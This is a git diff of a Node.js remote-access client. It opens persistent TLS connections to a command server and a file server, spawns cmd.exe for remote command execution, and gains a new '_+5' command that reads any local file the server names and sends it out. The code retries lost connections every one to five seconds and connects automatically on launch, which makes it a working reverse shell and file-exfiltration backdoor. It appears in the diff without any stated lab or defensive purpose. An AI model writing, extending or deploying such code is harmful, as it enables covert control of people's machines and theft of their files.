@@ -23,6 +23,10 @@ let fsClient = {}
 let comAlive = false
 let connID
 
+/**
+ * WriteFile takes destination and creates a new filestream which is written to by the fsClient stream
+ * @param {string} destination 
+ */
 const writeFile = (destination) => {
     if (destination) {
         console.log('destination', destination)
@@ -42,8 +46,38 @@ const writeFile = (destination) => {
 }
 
 /**
+ * sendFile takes localfile and create's a readstream which is piped to fsClient socket stream
+ * @param {string} localFile 
+ */
+const sendFile = (localFile) => {
+    console.log(fs.existsSync(localFile))
+    try {
+        if (fs.existsSync(localFile)) {
+
+            let localfs = fs.createReadStream(localFile)
+
+            localfs.on('open', () => {
+                localfs.pipe(fsClient)
+            })
+
+            localfs.on('error', (err) => {
+                console.log(err)
+            })
+
+            localfs.on('end', () => {
+                console.log('File fully sent\n')
+                fsClient.destroy()
+                localfs.close()
+            })
+        }
+    } catch (err) {
+        console.log(err)
+    }
+}
+
+/**
  * Function: Spawns a zsh/cmd/sh child process and streams the stdout back to client socket
- * @param {*} client 
+ * @param {socket} comClient 
  */
 const shellSpawn = (comClient) => { //client, fsClient
     const shell = child.spawn("cmd.exe", []); //cmd.exe , zsh
@@ -95,15 +129,30 @@ const shellSpawn = (comClient) => { //client, fsClient
                 connID = msg.substr(3)
                 fsClient.write('_+4' + connID)
                 break
+            case '_+5':
+                console.log('Sending file', msg.substr(3))
+                sendFile(msg.substr(3))
+                break
         }
     })
 }
 
+// async await wrapper to make certain functions async
 const asyncCall = (callback) => new Promise((resolve) => {
     callback(resolve)
 })
 
-const serverConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
+/**
+ * establishes connection to a file socket server using information below.
+ * Connection will be persistant and be reattempted every 1000ms on disconnect
+ * @param {number} PORT 
+ * @param {string} HOST 
+ * @param {object} tlsCerts 
+ * @param {socket} comClient 
+ * @param {function} cb 
+ * @returns 
+ */
+const fsServerConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
     const client = tls.connect(PORT, HOST, tlsCerts)
 
     client.on('secure', () => {
@@ -122,7 +171,7 @@ const serverConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
         client.destroy()
         if(comAlive == true) {
             setTimeout(() => {
-                fsClient = serverConnect(PORT, HOST, tlsCerts, cb)
+                fsClient = fsServerConnect(PORT, HOST, tlsCerts, cb)
             }, 1000)
         }
     })
@@ -136,20 +185,26 @@ const serverConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
     return client
 }
 
-//===========================
-
-const TESTserverConnect = (PORT, HOST, tlsCerts) => {
+/**
+ * creates a connection to a communication socket server.
+ * connection is persistant and will attempt to reconnect every 5s
+ * @param {number} PORT 
+ * @param {string} HOST 
+ * @param {object} tlsCerts 
+ * @returns 
+ */
+const comServerConnect = (PORT, HOST, tlsCerts) => {
     const client = tls.connect(PORT, HOST, tlsCerts)
 
     client.on('secure', async () => {
         comAlive = true
         console.log(`Connected to port ${PORT}`)
         fsClient = await asyncCall((resolve) => {
-            return serverConnect(_fsPort, _host, _options, client, resolve)
+            return fsServerConnect(_fsPort, _host, _options, client, resolve)
         })
         shellSpawn(client)
     })
-
+    
     client.on('close', () => {
         comAlive = false
         connID = undefined
@@ -157,7 +212,7 @@ const TESTserverConnect = (PORT, HOST, tlsCerts) => {
         // fsClient.destroy()
         client.destroy()
         setTimeout(() => {
-            TESTserverConnect(PORT, HOST, tlsCerts)
+            comServerConnect(PORT, HOST, tlsCerts)
         }, 5000)
     })
 
@@ -175,23 +230,4 @@ const TESTserverConnect = (PORT, HOST, tlsCerts) => {
 
 //===========================
 
-TESTserverConnect(_comPort, _host, _options)
-
-// // Run function on first execution to create connection
-// const main = async () => {
-//     comClient = await asyncCall((resolve) => {
-//         return TESTserverConnect(2222, '127.0.0.1', options, resolve)
-//     })
-
-//     // comClient = await asyncCall((resolve) => {
-//     //     return serverConnect(2222, '127.0.0.1', options, resolve)
-//     // })
-    
-//     // fsClient = await asyncCall((resolve) => {
-//     //     return serverConnect(2223, '127.0.0.1', options, resolve)
-//     // })
-    
-//     // shellSpawn()
-// }
-
-// main()
+comServerConnect(_comPort, _host, _options)
